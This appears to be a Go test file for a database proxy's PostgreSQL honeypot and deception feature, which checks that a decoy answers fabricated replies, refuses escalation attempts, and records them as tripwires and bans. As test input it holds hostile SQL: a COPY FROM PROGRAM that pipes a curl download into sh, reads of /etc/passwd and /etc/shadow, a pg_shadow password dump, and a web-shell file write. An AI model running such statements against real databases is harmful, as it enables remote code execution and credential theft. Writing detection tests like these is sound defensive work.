package postgres

import (
	"strings"
	"testing"
	"time"

	wire "github.com/rom/xproxy/internal/pgwire"
	"github.com/rom/xproxy/internal/proxy"
	"github.com/rom/xproxy/internal/proxytest"
)

// A fabricated database, through the whole relay.
//
// These are the tests that say the wiring is right rather than that the replies
// are: a honeypot listener that completes a startup with no server behind it, a
// refusal on a real listener answered by the fabrication instead, and the
// escalation recorded while the real server saw none of it.

// pgDecoyYAML is a listener that is nothing but a fabricated server. There is no
// upstream because there is nothing behind it, which is also the one mode the
// validator lets go without one.
const pgDecoyYAML = `
version: 1
server:
  listeners:
    - name: db
      address: "127.0.0.1:0"
      kind: postgres
      postgres:
        require_tls: false
        default_action: allow
        deception:
          mode: decoy
          profile: rails
          version: "13.14 (Debian 13.14-1.pgdg120+2)"
logging: {access: {enabled: false}}
`

// ask sends a statement and reads the whole reply back, which is more than
// query's error text: the fabrication's answers are the point here.
func (cl *client) ask(t *testing.T, sql string) *pgReply {
	t.Helper()
	if _, err := cl.c.Write(frame(wire.MsgQuery, append([]byte(sql), 0))); err != nil {
		t.Fatalf("%q: %v", sql, err)
	}
	return cl.collect(t, sql)
}

// collect reads messages until ReadyForQuery and reassembles them, so the reply
// is parsed by the harness's own framing rather than the one under test.
func (cl *client) collect(t *testing.T, what string) *pgReply {
	t.Helper()
	var raw []byte
	for i := 0; i < 256; i++ {
		m, err := cl.rd.Next()
		if err != nil {
			t.Fatalf("%q: %v", what, err)
		}
		raw = append(raw, frame(m.Type, m.Body)...)
		if m.Type == wire.MsgReadyForQuery {
			return parseReply(t, raw)
		}
	}
	t.Fatalf("%q: no ReadyForQuery in 256 messages", what)
	return nil
}

// A honeypot listener: it completes the startup, and there is nothing behind it.
func TestAPostgresDecoyListenerAnswersWithNoServerBehindIt(t *testing.T) {
	s := proxytest.Start(t, pgDecoyYAML)
	cl := dial(t, proxytest.Addr(t, s, "db"), "user", "app", "database", "app_production")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("the startup was refused: %s", e)
	}
	if got := onePG(t, cl.ask(t, "SELECT version()")); !strings.Contains(got, "13.14") {
		t.Errorf("version() answered %q", got)
	}
	if got := onePG(t, cl.ask(t, "SELECT current_database()")); got != "app_production" {
		t.Errorf("current_database answered %q", got)
	}
	tables := cl.ask(t, "SELECT schemaname, tablename FROM pg_tables")
	names := make([]string, 0, len(tables.rows))
	for _, row := range tables.rows {
		names = append(names, *row[1])
	}
	if !hasPGName(names, "active_storage_blobs") {
		t.Errorf("the rails profile's tables are %v", names)
	}
	// The connection is still usable after an error, because a session that ended
	// on the first refused statement collects one statement.
	if r := cl.ask(t, "SELECT pg_read_file('/etc/passwd')"); r.code != "42501" {
		t.Errorf("a file read answered %s %q", r.code, r.text)
	}
	if got := onePG(t, cl.ask(t, "SELECT 1")); got != "1" {
		t.Errorf("the connection was unusable after a refusal: %q", got)
	}
	awaitPGCounter(t, s, func(sn proxy.Snapshot) bool { return sn.PostgresDeceived >= 5 },
		"the deception counter did not move")
	awaitPGCounter(t, s, func(sn proxy.Snapshot) bool { return sn.PostgresTripwire >= 1 },
		"the file read did not trip the wire")
	// The status view knows about it, which is where an operator looks.
	st, ok := pgDecoyStatus(s)
	if !ok {
		t.Fatal("the listener reported no decoy")
	}
	if st.Mode != "decoy" || st.Kind != "postgres" || st.Profile != "rails" {
		t.Errorf("status %+v", st)
	}
	if st.Served == 0 || st.Tripped == 0 || !st.Anyone || len(st.Visitors) != 1 {
		t.Errorf("status %+v", st)
	}
}

// The reconnaissance chain, answered, and then the escalation it was for -- which
// is the message worth having.
func TestThePostgresReconnaissanceChainIsAnsweredAndTheEscalationRecorded(t *testing.T) {
	s := proxytest.Start(t, pgDecoyYAML)
	cl := dial(t, proxytest.Addr(t, s, "db"), "user", "postgres")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("the startup was refused: %s", e)
	}
	// The questions whose answers decide what is possible.
	for _, step := range []string{
		"SELECT version()",
		"SELECT datname FROM pg_database",
		"SELECT current_setting('data_directory')",
		"SELECT usesuper FROM pg_user WHERE usename = current_user",
		"SELECT schemaname, tablename FROM pg_tables",
	} {
		if r := cl.ask(t, step); r.code != "" {
			t.Errorf("%s was refused: %s %s", step, r.code, r.text)
		}
	}
	// And the things they were for, each refused the way a real server refuses it
	// -- which is itself an answer, and a true one.
	for _, step := range []string{
		"SELECT usename, passwd FROM pg_shadow",
		"COPY t FROM PROGRAM 'curl http://a/b | sh'",
		"COPY t TO '/var/www/html/s.php'",
		"SELECT pg_read_file('/etc/passwd')",
		"SELECT lo_import('/etc/shadow')",
	} {
		if r := cl.ask(t, step); r.code == "" {
			t.Errorf("%s was answered rather than refused", step)
		}
	}
	awaitPGCounter(t, s, func(sn proxy.Snapshot) bool { return sn.PostgresTripwire >= 5 },
		"the escalation chain did not trip the wire")
	// The reconnaissance did not trip it, or every session would look like an
	// escalation.
	if sn := s.Stats(); sn.PostgresTripwire > sn.PostgresDeceived-5 {
		t.Errorf("%d of %d statements tripped", sn.PostgresTripwire, sn.PostgresDeceived)
	}
}

// The extended query protocol is declined rather than half-answered: answering a
// Parse means keeping a prepared statement and answering the Execute after it.
func TestTheDecoyDeclinesTheExtendedProtocolAndStaysUsable(t *testing.T) {
	s := proxytest.Start(t, pgDecoyYAML)
	cl := dial(t, proxytest.Addr(t, s, "db"), "user", "app")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("the startup was refused: %s", e)
	}
	body := append([]byte("s1\x00SELECT 1\x00"), 0, 0)
	if _, err := cl.c.Write(frame(wire.MsgParse, body)); err != nil {
		t.Fatal(err)
	}
	r := cl.collect(t, "Parse")
	if r.code != "0A000" {
		t.Errorf("a Parse answered %s %q", r.code, r.text)
	}
	// And the client falls back to a simple query, which every driver does.
	if got := onePG(t, cl.ask(t, "SELECT 1")); got != "1" {
		t.Errorf("the connection was unusable after a declined Parse: %q", got)
	}
	// A Sync on its own is answered with ReadyForQuery, because a client that
	// sent one and heard nothing waits for ever.
	if _, err := cl.c.Write(frame(wire.MsgSync, nil)); err != nil {
		t.Fatal(err)
	}
	if sync := cl.collect(t, "Sync"); sync.code != "" {
		t.Errorf("a Sync answered %s %q", sync.code, sync.text)
	}
}

// A decoy that refuses the login asks for the credential first, records its
// length, and never records the credential.
func TestADecoyThatRequiresAuthenticationAsksBeforeItRefuses(t *testing.T) {
	yaml := strings.Replace(pgDecoyYAML,
		"          mode: decoy\n", "          mode: decoy\n          require_auth: true\n", 1)
	s := proxytest.Start(t, yaml)
	cl := dial(t, proxytest.Addr(t, s, "db"), "user", "postgres")
	m, err := cl.rd.Next()
	if err != nil {
		t.Fatal(err)
	}
	// A server that refused before asking is one that never wanted a credential.
	if m.Type != wire.MsgAuthentication {
		t.Fatalf("the fabrication answered %q rather than asking for a credential", m.Type)
	}
	code, err := m.AuthRequest()
	if err != nil || code == wire.AuthOK {
		t.Fatalf("the request is %d, %v", code, err)
	}
	if _, err := cl.c.Write(frame(wire.MsgPasswordMessage, []byte("md5deadbeef\x00"))); err != nil {
		t.Fatal(err)
	}
	next, err := cl.rd.Next()
	if err != nil {
		t.Fatal(err)
	}
	if next.Type != wire.MsgErrorResponse {
		t.Fatalf("the credential was answered with %q", next.Type)
	}
	f, _ := next.ReadError()
	if got := wire.SQLState(f); got != "28P01" {
		t.Errorf("the refusal is %s", got)
	}
	awaitPGCounter(t, s, func(sn proxy.Snapshot) bool { return sn.PostgresDeceived >= 1 },
		"the attempt was not recorded")
}

// The same fabrication on a listener that fronts a real server: it answers where
// a refusal would be written, and nowhere else.
//
// That is the invariant the whole feature rests on -- a statement on its way to a
// real database is never answered from here -- and this is the test of it.
func TestOnARealPostgresListenerOnlyRefusalsAreFabricated(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	section := base +
		"        read_only: true\n" +
		"        deception:\n" +
		"          mode: answer\n" +
		"          clients: [\"127.0.0.0/8\"]\n" +
		"          version: \"15.6\"\n"
	s, addr := relayFor(t, section, fake.addr())
	cl := dial(t, addr, "user", "alice")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("startup: %s", e)
	}
	// A refused statement is answered by the fabrication rather than refused.
	r := cl.ask(t, "DROP TABLE users")
	if r.code != "" {
		t.Errorf("a refused statement was refused rather than fabricated: %s %q", r.code, r.text)
	}
	if r.tag != "DROP TABLE" {
		t.Errorf("the fabricated answer is tagged %q", r.tag)
	}
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("a fabricated statement reached the server: %q", got)
	}
	awaitPGCounter(t, s, func(sn proxy.Snapshot) bool { return sn.PostgresDeceived >= 1 },
		"the fabrication did not answer a refused statement")
	// A refused statement that is also an escalation is recorded as one: the
	// tripwire is what separates a client that was refused from a client that was
	// reaching for a shell, and it is the reason to read the record.
	if r := cl.ask(t, "COPY t FROM PROGRAM 'curl http://a/b | sh'"); r.code == "" {
		t.Error("COPY FROM PROGRAM was answered as a success")
	}
	awaitPGCounter(t, s, func(sn proxy.Snapshot) bool { return sn.PostgresTripwire >= 1 },
		"the escalation was not recorded as one")
	if got := fake.got(); len(got) != 0 {
		t.Fatalf("a fabricated statement reached the server: %q", got)
	}
	// An allowed statement still reaches the server, and its answer is the
	// server's. That is the invariant: the fabrication never stands in for a
	// statement that was going to arrive.
	if e := cl.query(t, "SELECT 1"); e != "" {
		t.Errorf("an allowed statement was refused: %s", e)
	}
	if got := fake.got(); len(got) != 1 || got[0] != "SELECT 1" {
		t.Errorf("the server saw %q", got)
	}
	// The refusal counters still moved: the fabrication replaces what the client
	// is told, not what the operator is told.
	if n := s.Stats().Refusals["postgres"]["read_only"]; n < 1 {
		t.Errorf("the refusal was not counted: %+v", s.Stats().Refusals["postgres"])
	}
}

// A client outside the section's list is refused rather than lied to.
func TestAPostgresClientOutsideTheListIsStillRefused(t *testing.T) {
	fake := startFake(t, &fakeServer{})
	section := base +
		"        read_only: true\n" +
		"        deception:\n" +
		"          mode: answer\n" +
		"          clients: [\"10.9.0.0/24\"]\n"
	s, addr := relayFor(t, section, fake.addr())
	cl := dial(t, addr, "user", "alice")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("startup: %s", e)
	}
	if e := cl.query(t, "DROP TABLE users"); e == "" {
		t.Error("a client outside the list was fabricated to")
	}
	if n := s.Stats().PostgresDeceived; n != 0 {
		t.Errorf("the fabrication answered %d statements for a client outside its list", n)
	}
}

func hasPGName(names []string, want string) bool {
	for _, n := range names {
		if n == want {
			return true
		}
	}
	return false
}

// pgDecoyStatus finds this listener's decoy in the status view.
func pgDecoyStatus(s *proxy.Server) (proxy.DecoyStatus, bool) {
	for _, st := range s.DeviceDecoys() {
		if st.Kind == "postgres" {
			return st, true
		}
	}
	return proxy.DecoyStatus{}, false
}

// awaitPGCounter polls for a condition, because the relay decides on its own
// goroutines.
func awaitPGCounter(t *testing.T, s *proxy.Server, ok func(proxy.Snapshot) bool, what string) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if ok(s.Stats()) {
			return
		}
		time.Sleep(5 * time.Millisecond)
	}
	t.Fatalf("%s: deceived %d, tripped %d", what, s.Stats().PostgresDeceived, s.Stats().PostgresTripwire)
}

// The tripwire feeds the ban ladder, which is the difference between it and an
// ordinary fabricated exchange: a statement reaching for a file, a credential
// table or a shell is something every other listener would want to act on, while
// banning the exchange itself would end the collection.
func TestATrippedFabricationReachesTheBanLadder(t *testing.T) {
	s := proxytest.Start(t, pgDecoyYAML+`
bans:
  action: reject
  triggers: [{name: traps, reasons: [postgres_tripwire], threshold: 1, window: 1m, duration: 1h}]
`)
	cl := dial(t, proxytest.Addr(t, s, "db"), "user", "app", "database", "app_production")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("the startup was refused: %s", e)
	}
	// Refused as the real server refuses it, and a tripwire either way: the
	// reach is the finding, not whether it succeeded.
	if r := cl.ask(t, "SELECT pg_read_file('/etc/passwd')"); r.code == "" {
		t.Fatal("a file read was answered rather than refused")
	}
	awaitPGCounter(t, s, func(sn proxy.Snapshot) bool { return sn.BansActive >= 1 },
		"the tripwire did not reach the ban ladder")
}

// And an ordinary fabricated statement does not reach it: a client must not be
// banned for having been answered.
func TestAnOrdinaryFabricatedPGStatementDoesNotBan(t *testing.T) {
	s := proxytest.Start(t, pgDecoyYAML+`
bans:
  action: reject
  triggers: [{name: traps, reasons: [postgres_tripwire], threshold: 1, window: 1m, duration: 1h}]
`)
	cl := dial(t, proxytest.Addr(t, s, "db"), "user", "app", "database", "app_production")
	if e := cl.waitReady(t); e != "" {
		t.Fatalf("the startup was refused: %s", e)
	}
	if got := onePG(t, cl.ask(t, "SELECT version()")); !strings.Contains(got, "13.14") {
		t.Fatalf("version() answered %q", got)
	}
	if got := onePG(t, cl.ask(t, "SELECT current_database()")); got != "app_production" {
		t.Fatalf("current_database answered %q", got)
	}
	awaitPGCounter(t, s, func(sn proxy.Snapshot) bool { return sn.PostgresDeceived >= 2 },
		"the fabrication did not answer")
	if n := s.Stats().BansActive; n != 0 {
		t.Errorf("ordinary fabricated statements banned the client: %d", n)
	}
}
